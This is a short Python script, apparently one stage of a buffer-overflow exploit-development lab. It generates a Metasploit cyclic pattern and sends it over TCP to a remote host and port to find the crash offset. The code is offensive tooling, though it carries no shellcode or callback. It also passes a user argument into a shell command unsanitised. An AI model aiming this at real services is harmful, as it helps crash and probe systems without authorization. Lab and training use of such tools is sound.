#!/usr/bin/env python3
# stage 3 generate pattern offset
# usage: ./stage3.py [RHOST] [RPORT] [BYTE_LENGTH] 
# an alternative to Immunity
import socket,sys,subprocess


RHOST = sys.argv[1]                                     # remote host
RPORT = int(sys.argv[2])                                # remote port
BYTE_LENGTH = sys.argv[3]                               # bytes to generate 


# use msf-pattern_create to generate the pattern
cmd = "msf-pattern_create -l {} > msf-pattern_file.txt".format(BYTE_LENGTH)
sp  = subprocess.Popen(cmd, shell=True)
rc  = sp.wait()


# open the file generated by msf-pattern_create
with open("msf-pattern_file.txt", "rb") as f:
    pattern = f.read()


# set encoding for python3
postfix = "\n"
buff =  bytes(pattern)
buff += bytes(postfix, encoding="ascii")


# handle payload 
print("[+] - Sendng Payload - [ {} Bytes ]".format(len(pattern) - len(postfix)))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))
s.send(buff)
s.close()
